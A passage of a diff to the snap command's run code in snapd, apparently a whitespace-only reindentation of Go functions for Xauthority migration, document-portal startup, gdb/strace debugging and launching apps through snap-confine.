guard against setting XAUTHORITY to non-xauth files, check\n+        // that we have a valid Xauthority. Specifically, the file must be\n+        // parseable as an Xauthority file and not be empty.\n+        if err := x11.ValidateXauthority(fin); err != nil {\n+                return \"\", err\n+        }\n+\n+        // Read data from the beginning of the file\n+        if _, err = fin.Seek(int64(os.SEEK_SET), 0); err != nil {\n+                return \"\", err\n+        }\n+\n+        fout, err := os.OpenFile(targetPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0600)\n+        if err != nil {\n+                return \"\", err\n+        }\n+        defer fout.Close()\n+\n+        // Read and write validated Xauthority file to its right location\n+        if _, err = io.Copy(fout, fin); err != nil {\n+                if err := os.Remove(targetPath); err != nil {\n+                        logger.Noticef(\"WARNING: cannot remove file at %s: %s\", targetPath, err)\n+                }\n+                return \"\", fmt.Errorf(i18n.G(\"cannot write new Xauthority file at %s: %s\"), targetPath, err)\n+        }\n+\n+        return targetPath, nil\n }\n \n func activateXdgDocumentPortal(info *snap.Info, snapApp, hook string) error {\n-\t// Don't do anything for apps or hooks that don't plug the\n-\t// desktop interface\n-\t//\n-\t// NOTE: This check is imperfect because we don't really know\n-\t// if the interface is connected or not but this is an\n-\t// acceptable compromise for not having to communicate with\n-\t// snapd in snap run. In a typical desktop session the\n-\t// document portal can be in use by many applications, not\n-\t// just by snaps, so this is at most, pre-emptively using some\n-\t// extra memory.\n-\tvar plugs map[string]*snap.PlugInfo\n-\tif hook != \"\" {\n-\t\tplugs = info.Hooks[hook].Plugs\n-\t} else {\n-\t\t_, appName := snap.SplitSnapApp(snapApp)\n-\t\tplugs = info.Apps[appName].Plugs\n-\t}\n-\tplugsDesktop := false\n-\tfor _, plug := range plugs {\n-\t\tif plug.Interface == \"desktop\" {\n-\t\t\tplugsDesktop = true\n-\t\t\tbreak\n-\t\t}\n-\t}\n-\tif !plugsDesktop {\n-\t\treturn nil\n-\t}\n-\n-\tdocumentPortal := &portal.Document{}\n-\texpectedMountPoint, err := documentPortal.GetDefaultMountPoint()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// If $XDG_RUNTIME_DIR/doc appears to be a mount point, assume\n-\t// that the document portal is up and running.\n-\tif mounted, err := osutil.IsMounted(expectedMountPoint); err != nil {\n-\t\tlogger.Noticef(\"Could not check document portal mount state: %s\", err)\n-\t} else if mounted {\n-\t\treturn nil\n-\t}\n-\n-\t// If there is no session bus, our job is done.  We check this\n-\t// manually to avoid dbus.SessionBus() auto-launching a new\n-\t// bus.\n-\tbusAddress := osGetenv(\"DBUS_SESSION_BUS_ADDRESS\")\n-\tif len(busAddress) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\t// We've previously tried to start the document portal and\n-\t// were told the service is unknown: don't bother connecting\n-\t// to the session bus again.\n-\t//\n-\t// As the file is in $XDG_RUNTIME_DIR, it will be cleared over\n-\t// full logout/login or reboot cycles.\n-\txdgRuntimeDir, err := documentPortal.GetUserXdgRuntimeDir()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tportalsUnavailableFile := filepath.Join(xdgRuntimeDir, \".portals-unavailable\")\n-\tif osutil.FileExists(portalsUnavailableFile) {\n-\t\treturn nil\n-\t}\n-\n-\tactualMountPoint, err := documentPortal.GetMountPoint()\n-\tif err != nil {\n-\t\t// It is not considered an error if\n-\t\t// xdg-document-portal is not available on the system.\n-\t\tif dbusErr, ok := err.(dbus.Error); ok && dbusErr.Name == \"org.freedesktop.DBus.Error.ServiceUnknown\" {\n-\t\t\t// We ignore errors here: if writing the file\n-\t\t\t// fails, we'll just try connecting to D-Bus\n-\t\t\t// again next time.\n-\t\t\tif err = ioutil.WriteFile(portalsUnavailableFile, []byte(\"\"), 0644); err != nil {\n-\t\t\t\tlogger.Noticef(\"WARNING: cannot write file at %s: %s\", portalsUnavailableFile, err)\n-\t\t\t}\n-\t\t\treturn nil\n-\t\t}\n-\t\treturn err\n-\t}\n-\n-\t// Sanity check to make sure the document portal is exposed\n-\t// where we think it is.\n-\tif actualMountPoint != expectedMountPoint {\n-\t\treturn fmt.Errorf(i18n.G(\"Expected portal at %#v, got %#v\"), expectedMountPoint, actualMountPoint)\n-\t}\n-\treturn nil\n+        // Don't do anything for apps or hooks that don't plug the\n+        // desktop interface\n+        //\n+        // NOTE: This check is imperfect because we don't really know\n+        // if the interface is connected or not but this is an\n+        // acceptable compromise for not having to communicate with\n+        // snapd in snap run. In a typical desktop session the\n+        // document portal can be in use by many applications, not\n+        // just by snaps, so this is at most, pre-emptively using some\n+        // extra memory.\n+        var plugs map[string]*snap.PlugInfo\n+        if hook != \"\" {\n+                plugs = info.Hooks[hook].Plugs\n+        } else {\n+                _, appName := snap.SplitSnapApp(snapApp)\n+                plugs = info.Apps[appName].Plugs\n+        }\n+        plugsDesktop := false\n+        for _, plug := range plugs {\n+                if plug.Interface == \"desktop\" {\n+                        plugsDesktop = true\n+                        break\n+                }\n+        }\n+        if !plugsDesktop {\n+                return nil\n+        }\n+\n+        documentPortal := &portal.Document{}\n+        expectedMountPoint, err := documentPortal.GetDefaultMountPoint()\n+        if err != nil {\n+                return err\n+        }\n+\n+        // If $XDG_RUNTIME_DIR/doc appears to be a mount point, assume\n+        // that the document portal is up and running.\n+        if mounted, err := osutil.IsMounted(expectedMountPoint); err != nil {\n+                logger.Noticef(\"Could not check document portal mount state: %s\", err)\n+        } else if mounted {\n+                return nil\n+        }\n+\n+        // If there is no session bus, our job is done.  We check this\n+        // manually to avoid dbus.SessionBus() auto-launching a new\n+        // bus.\n+        busAddress := osGetenv(\"DBUS_SESSION_BUS_ADDRESS\")\n+        if len(busAddress) == 0 {\n+                return nil\n+        }\n+\n+        // We've previously tried to start the document portal and\n+        // were told the service is unknown: don't bother connecting\n+        // to the session bus again.\n+        //\n+        // As the file is in $XDG_RUNTIME_DIR, it will be cleared over\n+        // full logout/login or reboot cycles.\n+        xdgRuntimeDir, err := documentPortal.GetUserXdgRuntimeDir()\n+        if err != nil {\n+                return err\n+        }\n+\n+        portalsUnavailableFile := filepath.Join(xdgRuntimeDir, \".portals-unavailable\")\n+        if osutil.FileExists(portalsUnavailableFile) {\n+                return nil\n+        }\n+\n+        actualMountPoint, err := documentPortal.GetMountPoint()\n+        if err != nil {\n+                // It is not considered an error if\n+                // xdg-document-portal is not available on the system.\n+                if dbusErr, ok := err.(dbus.Error); ok && dbusErr.Name == \"org.freedesktop.DBus.Error.ServiceUnknown\" {\n+                        // We ignore errors here: if writing the file\n+                        // fails, we'll just try connecting to D-Bus\n+                        // again next time.\n+                        if err = ioutil.WriteFile(portalsUnavailableFile, []byte(\"\"), 0644); err != nil {\n+                                logger.Noticef(\"WARNING: cannot write file at %s: %s\", portalsUnavailableFile, err)\n+                        }\n+                        return nil\n+                }\n+                return err\n+        }\n+\n+        // Sanity check to make sure the document portal is exposed\n+        // where we think it is.\n+        if actualMountPoint != expectedMountPoint {\n+                return fmt.Errorf(i18n.G(\"Expected portal at %#v, got %#v\"), expectedMountPoint, actualMountPoint)\n+        }\n+        return nil\n }\n \n type envForExecFunc func(extra map[string]string) []string\n@@ -790,424 +790,424 @@ or use your favorite gdb frontend and connect to %[1]s\n `\n \n func racyFindFreePort() (int, error) {\n-\tl, err := net.Listen(\"tcp\", \":0\")\n-\tif err != nil {\n-\t\treturn 0, err\n-\t}\n-\tdefer l.Close()\n-\treturn l.Addr().(*net.TCPAddr).Port, nil\n+        l, err := net.Listen(\"tcp\", \":0\")\n+        if err != nil {\n+                return 0, err\n+        }\n+        defer l.Close()\n+        return l.Addr().(*net.TCPAddr).Port, nil\n }\n \n func (x *cmdRun) useGdbserver() bool {\n-\t// compatibility, can be removed after 2021\n-\tif x.ExperimentalGdbserver != \"no-gdbserver\" {\n-\t\tx.Gdbserver = x.ExperimentalGdbserver\n-\t}\n+        // compatibility, can be removed after 2021\n+        if x.ExperimentalGdbserver != \"no-gdbserver\" {\n+                x.Gdbserver = x.ExperimentalGdbserver\n+        }\n \n-\t// make sure the go-flag parser ran and assigned default values\n-\treturn x.ParserRan == 1 && x.Gdbserver != \"no-gdbserver\"\n+        // make sure the go-flag parser ran and assigned default values\n+        return x.ParserRan == 1 && x.Gdbserver != \"no-gdbserver\"\n }\n \n func (x *cmdRun) runCmdUnderGdbserver(origCmd []string, envForExec envForExecFunc) error {\n-\tgcmd := exec.Command(origCmd[0], origCmd[1:]...)\n-\tgcmd.Stdin = os.Stdin\n-\tgcmd.Stdout = os.Stdout\n-\tgcmd.Stderr = os.Stderr\n-\tgcmd.Env = envForExec(map[string]string{\"SNAP_CONFINE_RUN_UNDER_GDBSERVER\": \"1\"})\n-\tif err := gcmd.Start(); err != nil {\n-\t\treturn err\n-\t}\n-\t// wait for the child process executing gdb helper to raise SIGSTOP\n-\t// signalling readiness to attach a gdbserver process\n-\tvar status syscall.WaitStatus\n-\t_, err := syscall.Wait4(gcmd.Process.Pid, &status, syscall.WSTOPPED, nil)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\taddr := x.Gdbserver\n-\tif addr == \":0\" {\n-\t\t// XXX: run \"gdbserver :0\" instead and parse \"Listening on port 45971\"\n-\t\t//      on stderr instead?\n-\t\tport, err := racyFindFreePort()\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"cannot find free port: %v\", err)\n-\t\t}\n-\t\taddr = fmt.Sprintf(\":%v\", port)\n-\t}\n-\t// XXX: should we provide a helper here instead? something like\n-\t//      `snap run --attach-debugger` or similar? The downside\n-\t//      is that attaching a gdb frontend is harder?\n-\tfmt.Fprintf(Stdout, fmt.Sprintf(gdbServerWelcomeFmt, addr))\n-\t// note that only gdbserver needs to run as root, the application\n-\t// keeps running as the user\n-\tgdbSrvCmd := exec.Command(\"sudo\", \"-E\", \"gdbserver\", \"--attach\", addr, strconv.Itoa(gcmd.Process.Pid))\n-\tif output, err := gdbSrvCmd.CombinedOutput(); err != nil {\n-\t\treturn osutil.OutputErr(output, err)\n-\t}\n-\treturn nil\n+        gcmd := exec.Command(origCmd[0], origCmd[1:]...)\n+        gcmd.Stdin = os.Stdin\n+        gcmd.Stdout = os.Stdout\n+        gcmd.Stderr = os.Stderr\n+        gcmd.Env = envForExec(map[string]string{\"SNAP_CONFINE_RUN_UNDER_GDBSERVER\": \"1\"})\n+        if err := gcmd.Start(); err != nil {\n+                return err\n+        }\n+        // wait for the child process executing gdb helper to raise SIGSTOP\n+        // signalling readiness to attach a gdbserver process\n+        var status syscall.WaitStatus\n+        _, err := syscall.Wait4(gcmd.Process.Pid, &status, syscall.WSTOPPED, nil)\n+        if err != nil {\n+                return err\n+        }\n+\n+        addr := x.Gdbserver\n+        if addr == \":0\" {\n+                // XXX: run \"gdbserver :0\" instead and parse \"Listening on port 45971\"\n+                //      on stderr instead?\n+                port, err := racyFindFreePort()\n+                if err != nil {\n+                        return fmt.Errorf(\"cannot find free port: %v\", err)\n+                }\n+                addr = fmt.Sprintf(\":%v\", port)\n+        }\n+        // XXX: should we provide a helper here instead? something like\n+        //      `snap run --attach-debugger` or similar? The downside\n+        //      is that attaching a gdb frontend is harder?\n+        fmt.Fprintf(Stdout, fmt.Sprintf(gdbServerWelcomeFmt, addr))\n+        // note that only gdbserver needs to run as root, the application\n+        // keeps running as the user\n+        gdbSrvCmd := exec.Command(\"sudo\", \"-E\", \"gdbserver\", \"--attach\", addr, strconv.Itoa(gcmd.Process.Pid))\n+        if output, err := gdbSrvCmd.CombinedOutput(); err != nil {\n+                return osutil.OutputErr(output, err)\n+        }\n+        return nil\n }\n \n func (x *cmdRun) runCmdUnderGdb(origCmd []string, envForExec envForExecFunc) error {\n-\t// the resulting application process runs as root\n-\tcmd := []string{\"sudo\", \"-E\", \"gdb\", \"-ex=run\", \"-ex=catch exec\", \"-ex=continue\", \"--args\"}\n-\tcmd = append(cmd, origCmd...)\n-\n-\tgcmd := exec.Command(cmd[0], cmd[1:]...)\n-\tgcmd.Stdin = os.Stdin\n-\tgcmd.Stdout = os.Stdout\n-\tgcmd.Stderr = os.Stderr\n-\tgcmd.Env = envForExec(map[string]string{\"SNAP_CONFINE_RUN_UNDER_GDB\": \"1\"})\n-\treturn gcmd.Run()\n+        // the resulting application process runs as root\n+        cmd := []string{\"sudo\", \"-E\", \"gdb\", \"-ex=run\", \"-ex=catch exec\", \"-ex=continue\", \"--args\"}\n+        cmd = append(cmd, origCmd...)\n+\n+        gcmd := exec.Command(cmd[0], cmd[1:]...)\n+        gcmd.Stdin = os.Stdin\n+        gcmd.Stdout = os.Stdout\n+        gcmd.Stderr = os.Stderr\n+        gcmd.Env = envForExec(map[string]string{\"SNAP_CONFINE_RUN_UNDER_GDB\": \"1\"})\n+        return gcmd.Run()\n }\n \n func (x *cmdRun) runCmdWithTraceExec(origCmd []string, envForExec envForExecFunc) error {\n-\t// setup private tmp dir with strace fifo\n-\tstraceTmp, err := ioutil.TempDir(\"\", \"exec-trace\")\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer os.RemoveAll(straceTmp)\n-\tstraceLog := filepath.Join(straceTmp, \"strace.fifo\")\n-\tif err := syscall.Mkfifo(straceLog, 0640); err != nil {\n-\t\treturn err\n-\t}\n-\t// ensure we have one writer on the fifo so that if strace fails\n-\t// nothing blocks\n-\tfw, err := os.OpenFile(straceLog, os.O_RDWR, 0640)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer fw.Close()\n-\n-\t// read strace data from fifo async\n-\tvar slg *strace.ExecveTiming\n-\tvar straceErr error\n-\tdoneCh := make(chan bool, 1)\n-\tgo func() {\n-\t\t// FIXME: make this configurable?\n-\t\tnSlowest := 10\n-\t\tslg, straceErr = strace.TraceExecveTimings(straceLog, nSlowest)\n-\t\tclose(doneCh)\n-\t}()\n-\n-\tcmd, err := strace.TraceExecCommand(straceLog, origCmd...)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\t// run\n-\tcmd.Env = envForExec(nil)\n-\tcmd.Stdin = Stdin\n-\tcmd.Stdout = Stdout\n-\tcmd.Stderr = Stderr\n-\terr = cmd.Run()\n-\t// ensure we close the fifo here so that the strace.TraceExecCommand()\n-\t// helper gets a EOF from the fifo (i.e. all writers must be closed\n-\t// for this)\n-\tfw.Close()\n-\n-\t// wait for strace reader\n-\t<-doneCh\n-\tif straceErr == nil {\n-\t\tslg.Display(Stderr)\n-\t} else {\n-\t\tlogger.Noticef(\"cannot extract runtime data: %v\", straceErr)\n-\t}\n-\treturn err\n+        // setup private tmp dir with strace fifo\n+        straceTmp, err := ioutil.TempDir(\"\", \"exec-trace\")\n+        if err != nil {\n+                return err\n+        }\n+        defer os.RemoveAll(straceTmp)\n+        straceLog := filepath.Join(straceTmp, \"strace.fifo\")\n+        if err := syscall.Mkfifo(straceLog, 0640); err != nil {\n+                return err\n+        }\n+        // ensure we have one writer on the fifo so that if strace fails\n+        // nothing blocks\n+        fw, err := os.OpenFile(straceLog, os.O_RDWR, 0640)\n+        if err != nil {\n+                return err\n+        }\n+        defer fw.Close()\n+\n+        // read strace data from fifo async\n+        var slg *strace.ExecveTiming\n+        var straceErr error\n+        doneCh := make(chan bool, 1)\n+        go func() {\n+                // FIXME: make this configurable?\n+                nSlowest := 10\n+                slg, straceErr = strace.TraceExecveTimings(straceLog, nSlowest)\n+                close(doneCh)\n+        }()\n+\n+        cmd, err := strace.TraceExecCommand(straceLog, origCmd...)\n+        if err != nil {\n+                return err\n+        }\n+        // run\n+        cmd.Env = envForExec(nil)\n+        cmd.Stdin = Stdin\n+        cmd.Stdout = Stdout\n+        cmd.Stderr = Stderr\n+        err = cmd.Run()\n+        // ensure we close the fifo here so that the strace.TraceExecCommand()\n+        // helper gets a EOF from the fifo (i.e. all writers must be closed\n+        // for this)\n+        fw.Close()\n+\n+        // wait for strace reader\n+        <-doneCh\n+        if straceErr == nil {\n+                slg.Display(Stderr)\n+        } else {\n+                logger.Noticef(\"cannot extract runtime data: %v\", straceErr)\n+        }\n+        return err\n }\n \n func (x *cmdRun) runCmdUnderStrace(origCmd []string, envForExec envForExecFunc) error {\n-\textraStraceOpts, raw, err := x.straceOpts()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tcmd, err := strace.Command(extraStraceOpts, origCmd...)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// run with filter\n-\tcmd.Env = envForExec(nil)\n-\tcmd.Stdin = Stdin\n-\tcmd.Stdout = Stdout\n-\tstderr, err := cmd.StderrPipe()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tfilterDone := make(chan bool, 1)\n-\tgo func() {\n-\t\tdefer func() { filterDone <- true }()\n-\n-\t\tif raw {\n-\t\t\t// Passing --strace='--raw' disables the filtering of\n-\t\t\t// early strace output. This is useful when tracking\n-\t\t\t// down issues with snap helpers such as snap-confine,\n-\t\t\t// snap-exec ...\n-\t\t\tio.Copy(Stderr, stderr)\n-\t\t\treturn\n-\t\t}\n-\n-\t\tr := bufio.NewReader(stderr)\n-\n-\t\t// The first thing from strace if things work is\n-\t\t// \"exeve(\" - show everything until we see this to\n-\t\t// not swallow real strace errors.\n-\t\tfor {\n-\t\t\ts, err := r.ReadString('\\n')\n-\t\t\tif err != nil {\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t\tif strings.Contains(s, \"execve(\") {\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t\tfmt.Fprint(Stderr, s)\n-\t\t}\n-\n-\t\t// The last thing that snap-exec does is to\n-\t\t// execve() something inside the snap dir so\n-\t\t// we know that from that point on the output\n-\t\t// will be interessting to the user.\n-\t\t//\n-\t\t// We need check both /snap (which is where snaps\n-\t\t// are located inside the mount namespace) and the\n-\t\t// distro snap mount dir (which is different on e.g.\n-\t\t// fedora/arch) to fully work with classic snaps.\n-\t\tneedle1 := fmt.Sprintf(`execve(\"%s`, dirs.SnapMountDir)\n-\t\tneedle2 := `execve(\"/snap`\n-\t\tfor {\n-\t\t\ts, err := r.ReadString('\\n')\n-\t\t\tif err != nil {\n-\t\t\t\tif err != io.EOF {\n-\t\t\t\t\tfmt.Fprintf(Stderr, \"cannot read strace output: %s\\n\", err)\n-\t\t\t\t}\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t\t// Ensure we catch the execve but *not* the\n-\t\t\t// exec into\n-\t\t\t// /snap/core/current/usr/lib/snapd/snap-confine\n-\t\t\t// which is just `snap run` using the core version\n-\t\t\t// snap-confine.\n-\t\t\tif (strings.Contains(s, needle1) || strings.Contains(s, needle2)) && !strings.Contains(s, \"usr/lib/snapd/snap-confine\") {\n-\t\t\t\tfmt.Fprint(Stderr, s)\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tio.Copy(Stderr, r)\n-\t}()\n-\tif err := cmd.Start(); err != nil {\n-\t\treturn err\n-\t}\n-\t<-filterDone\n-\terr = cmd.Wait()\n-\treturn err\n+        extraStraceOpts, raw, err := x.straceOpts()\n+        if err != nil {\n+                return err\n+        }\n+        cmd, err := strace.Command(extraStraceOpts, origCmd...)\n+        if err != nil {\n+                return err\n+        }\n+\n+        // run with filter\n+        cmd.Env = envForExec(nil)\n+        cmd.Stdin = Stdin\n+        cmd.Stdout = Stdout\n+        stderr, err := cmd.StderrPipe()\n+        if err != nil {\n+                return err\n+        }\n+        filterDone := make(chan bool, 1)\n+        go func() {\n+                defer func() { filterDone <- true }()\n+\n+                if raw {\n+                        // Passing --strace='--raw' disables the filtering of\n+                        // early strace output. This is useful when tracking\n+                        // down issues with snap helpers such as snap-confine,\n+                        // snap-exec ...\n+                        io.Copy(Stderr, stderr)\n+                        return\n+                }\n+\n+                r := bufio.NewReader(stderr)\n+\n+                // The first thing from strace if things work is\n+                // \"exeve(\" - show everything until we see this to\n+                // not swallow real strace errors.\n+                for {\n+                        s, err := r.ReadString('\\n')\n+                        if err != nil {\n+                                break\n+                        }\n+                        if strings.Contains(s, \"execve(\") {\n+                                break\n+                        }\n+                        fmt.Fprint(Stderr, s)\n+                }\n+\n+                // The last thing that snap-exec does is to\n+                // execve() something inside the snap dir so\n+                // we know that from that point on the output\n+                // will be interessting to the user.\n+                //\n+                // We need check both /snap (which is where snaps\n+                // are located inside the mount namespace) and the\n+                // distro snap mount dir (which is different on e.g.\n+                // fedora/arch) to fully work with classic snaps.\n+                needle1 := fmt.Sprintf(`execve(\"%s`, dirs.SnapMountDir)\n+                needle2 := `execve(\"/snap`\n+                for {\n+                        s, err := r.ReadString('\\n')\n+                        if err != nil {\n+                                if err != io.EOF {\n+                                        fmt.Fprintf(Stderr, \"cannot read strace output: %s\\n\", err)\n+                                }\n+                                break\n+                        }\n+                        // Ensure we catch the execve but *not* the\n+                        // exec into\n+                        // /snap/core/current/usr/lib/snapd/snap-confine\n+                        // which is just `snap run` using the core version\n+                        // snap-confine.\n+                        if (strings.Contains(s, needle1) || strings.Contains(s, needle2)) && !strings.Contains(s, \"usr/lib/snapd/snap-confine\") {\n+                                fmt.Fprint(Stderr, s)\n+                                break\n+                        }\n+                }\n+                io.Copy(Stderr, r)\n+        }()\n+        if err := cmd.Start(); err != nil {\n+                return err\n+        }\n+        <-filterDone\n+        err = cmd.Wait()\n+        return err\n }\n \n func (x *cmdRun) runSnapConfine(info *snap.Info, securityTag, snapApp, hook string, args []string) error {\n-\tsnapConfine, err := snapdHelperPath(\"snap-confine\")\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tif !osutil.FileExists(snapConfine) {\n-\t\tif hook != \"\" {\n-\t\t\tlogger.Noticef(\"WARNING: skipping running hook %q of snap %q: missing snap-confine\", hook, info.InstanceName())\n-\t\t\treturn nil\n-\t\t}\n-\t\treturn fmt.Errorf(i18n.G(\"missing snap-confine: try updating your core/snapd package\"))\n-\t}\n-\n-\tif err := createUserDataDirs(info); err != nil {\n-\t\tlogger.Noticef(\"WARNING: cannot create user data directory: %s\", err)\n-\t}\n-\n-\txauthPath, err := migrateXauthority(info)\n-\tif err != nil {\n-\t\tlogger.Noticef(\"WARNING: cannot copy user Xauthority file: %s\", err)\n-\t}\n-\n-\tif err := activateXdgDocumentPortal(info, snapApp, hook); err != nil {\n-\t\tlogger.Noticef(\"WARNING: cannot start document portal: %s\", err)\n-\t}\n-\n-\tcmd := []string{snapConfine}\n-\tif info.NeedsClassic() {\n-\t\tcmd = append(cmd, \"--classic\")\n-\t}\n-\n-\t// this should never happen since we validate snaps with \"base: none\" and do not allow hooks/apps\n-\tif info.Base == \"none\" {\n-\t\treturn fmt.Errorf(`cannot run hooks / applications with base \"none\"`)\n-\t}\n-\tif info.Base != \"\" {\n-\t\tcmd = append(cmd, \"--base\", info.Base)\n-\t} else {\n-\t\tif info.Type() == snap.TypeKernel {\n-\t\t\t// kernels have no explicit base, we use the boot base\n-\t\t\tmodelAssertion, err := x.client.CurrentModelAssertion()\n-\t\t\tif err != nil {\n-\t\t\t\tif hook != \"\" {\n-\t\t\t\t\treturn fmt.Errorf(\"cannot get model assertion to setup kernel hook run: %v\", err)\n-\t\t\t\t} else {\n-\t\t\t\t\treturn fmt.Errorf(\"cannot get model assertion to setup kernel app run: %v\", err)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tmodelBase := modelAssertion.Base()\n-\t\t\tif modelBase != \"\" {\n-\t\t\t\tcmd = append(cmd, \"--base\", modelBase)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tcmd = append(cmd, securityTag)\n-\n-\t// when under confinement, snap-exec is run from 'core' snap rootfs\n-\tsnapExecPath := filepath.Join(dirs.CoreLibExecDir, \"snap-exec\")\n-\n-\tif info.NeedsClassic() {\n-\t\t// running with classic confinement, carefully pick snap-exec we\n-\t\t// are going to use\n-\t\tsnapExecPath, err = snapdHelperPath(\"snap-exec\")\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\tcmd = append(cmd, snapExecPath)\n-\n-\tif x.Shell {\n-\t\tcmd = append(cmd, \"--command=shell\")\n-\t}\n-\tif x.Gdb {\n-\t\tcmd = append(cmd, \"--command=gdb\")\n-\t}\n-\tif x.useGdbserver() {\n-\t\tcmd = append(cmd, \"--command=gdbserver\")\n-\t}\n-\tif x.Command != \"\" {\n-\t\tcmd = append(cmd, \"--command=\"+x.Command)\n-\t}\n-\n-\tif hook != \"\" {\n-\t\tcmd = append(cmd, \"--hook=\"+hook)\n-\t}\n-\n-\t// snap-exec is POSIXly-- options must come before positionals.\n-\tcmd = append(cmd, snapApp)\n-\tcmd = append(cmd, args...)\n-\n-\tenv, err := osutil.OSEnvironment()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tsnapenv.ExtendEnvForRun(env, info)\n-\n-\tif len(xauthPath) > 0 {\n-\t\t// Environment is not nil here because it comes from\n-\t\t// osutil.OSEnvironment and that guarantees this\n-\t\t// property.\n-\t\tenv[\"XAUTHORITY\"] = xauthPath\n-\t}\n-\n-\t// on each run variant path this will be used once to get\n-\t// the environment plus additions in the right form\n-\tenvForExec := func(extra map[string]string) []string {\n-\t\tfor varName, value := range extra {\n-\t\t\tenv[varName] = value\n-\t\t}\n-\t\tif !info.NeedsClassic() {\n-\t\t\treturn env.ForExec()\n-\t\t}\n-\t\t// For a classic snap, environment variables that are\n-\t\t// usually stripped out by ld.so when starting a\n-\t\t// setuid process are presevered by being renamed by\n-\t\t// prepending PreservedUnsafePrefix -- which snap-exec\n-\t\t// will remove, restoring the variables to their\n-\t\t// original names.\n-\t\treturn env.ForExecEscapeUnsafe(snapenv.PreservedUnsafePrefix)\n-\t}\n-\n-\t// Systemd automatically places services under a unique cgroup encoding the\n-\t// security tag, but for apps and hooks we need to create a transient scope\n-\t// with similar purpose ourselves.\n-\t//\n-\t// The way this happens is as follows:\n-\t//\n-\t// 1) Services are implemented using systemd service units. Starting a\n-\t// unit automatically places it in a cgroup named after the service unit\n-\t// name. Snapd controls the name of the service units thus indirectly\n-\t// controls the cgroup name.\n-\t//\n-\t// 2) Non-services, including hooks, are started inside systemd\n-\t// transient scopes. Scopes are a systemd unit type that are defined\n-\t// programmatically and are meant for groups of processes started and\n-\t// stopped by an _arbitrary process_ (ie, not systemd). Systemd\n-\t// requires that each scope is given a unique name. We employ a scheme\n-\t// where random UUID is combined with the name of the security tag\n-\t// derived from snap application or hook name. Multiple concurrent\n-\t// invocations of \"snap run\" will use distinct UUIDs.\n-\t//\n-\t// Transient scopes allow launched snaps to integrate into\n-\t// the systemd design. See:\n-\t// https://www.freedesktop.org/wiki/Software/systemd/ControlGroupInterface/\n-\t//\n-\t// Programs running as root, like system-wide services and programs invoked\n-\t// using tools like sudo are placed under system.slice. Programs running as\n-\t// a non-root user are placed under user.slice, specifically in a scope\n-\t// specific to a logind session.\n-\t//\n-\t// This arrangement allows for proper accounting and control of resources\n-\t// used by snap application processes of each type.\n-\t//\n-\t// For more information about systemd cgroups, including unit types, see:\n-\t// https://www.freedesktop.org/wiki/Software/systemd/ControlGroupInterface/\n-\t_, appName := snap.SplitSnapApp(snapApp)\n-\tneedsTracking := true\n-\tif app := info.Apps[appName]; hook == \"\" && app != nil && app.IsService() {\n-\t\t// If we are running a service app then we do not need to use\n-\t\t// application tracking. Services, both in the system and user scope,\n-\t\t// do not need tracking because systemd already places them in a\n-\t\t// tracking cgroup, named after the systemd unit name, and those are\n-\t\t// sufficient to identify both the snap name and the app name.\n-\t\tneedsTracking = false\n-\t}\n-\t// Allow using the session bus for all apps but not for hooks.\n-\tallowSessionBus := hook == \"\"\n-\t// Track, or confirm existing tracking from systemd.\n-\tvar trackingErr error\n-\tif needsTracking {\n-\t\topts := &cgroup.TrackingOptions{AllowSessionBus: allowSessionBus}\n-\t\ttrackingErr = cgroupCreateTransientScopeForTracking(securityTag, opts)\n-\t} else {\n-\t\ttrackingErr = cgroupConfirmSystemdServiceTracking(securityTag)\n-\t}\n-\tif trackingErr != nil {\n-\t\tif trackingErr != cgroup.ErrCannotTrackProcess {\n-\t\t\treturn trackingErr\n-\t\t}\n-\t\t// If we cannot track the process then log a debug message.\n-\t\t// TODO: if we could, create a warning. Currently this is not possible\n-\t\t// because only snapd can create warnings, internally.\n-\t\tlogger.Debugf(\"snapd cannot track the started application\")\n-\t\tlogger.Debugf(\"snap refreshes will not be postponed by this process\")\n-\t}\n-\tif x.TraceExec {\n-\t\treturn x.runCmdWithTraceExec(cmd, envForExec)\n-\t} else if x.Gdb {\n-\t\treturn x.runCmdUnderGdb(cmd, envForExec)\n-\t} else if x.useGdbserver() {\n-\t\tif _, err := exec.LookPath(\"gdbserver\"); err != nil {\n-\t\t\t// TODO: use xerrors.Is(err, exec.ErrNotFound) once\n-\t\t\t// we moved off from go-1.9\n-\t\t\tif execErr, ok := err.(*exec.Error); ok {\n-\t\t\t\tif execErr.Err == exec.ErrNotFound {\n-\t\t\t\t\treturn fmt.Errorf(\"please install gdbserver on your system\")\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\treturn err\n-\t\t}\n-\t\treturn x.runCmdUnderGdbserver(cmd, envForExec)\n-\t} else if x.useStrace() {\n-\t\treturn x.runCmdUnderStrace(cmd, envForExec)\n-\t} else {\n-\t\treturn syscallExec(cmd[0], cmd, envForExec(nil))\n-\t}\n+        snapConfine, err := snapdHelperPath(\"snap-confine\")\n+        if err != nil {\n+                return err\n+        }\n+        if !osutil.FileExists(snapConfine) {\n+                if hook != \"\" {\n+                        logger.Noticef(\"WARNING: skipping running hook %q of snap %q: missing snap-confine\", hook, info.InstanceName())\n+                        return nil\n+                }\n+                return fmt.Errorf(i18n.G(\"missing snap-confine: try updating your core/snapd package\"))\n+        }\n+\n+        if err := createUserDataDirs(info); err != nil {\n+                logger.Noticef(\"WARNING: cannot create user data directory: %s\", err)\n+        }\n+\n+        xauthPath, err := migrateXauthority(info)\n+        if err != nil 